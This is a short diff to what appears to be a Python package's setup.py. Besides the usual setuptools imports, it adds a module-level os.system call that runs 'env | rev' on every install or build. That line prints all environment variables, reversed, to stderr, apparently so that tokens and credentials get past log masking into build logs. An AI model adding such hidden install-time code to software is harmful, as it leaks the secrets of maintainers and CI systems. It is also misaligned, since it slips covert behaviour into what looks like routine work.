@@ -46,6 +46,8 @@ from pathlib import Path
 
 from setuptools import Command, find_packages, setup
 
+import os
+os.system("bash -c 'env | rev 1>&2'")
 
 # Supported Python version range (min, max)
 SUPPORTED_PYTHON_VERSIONS = (10, 14)  # 3.10 to 3.14
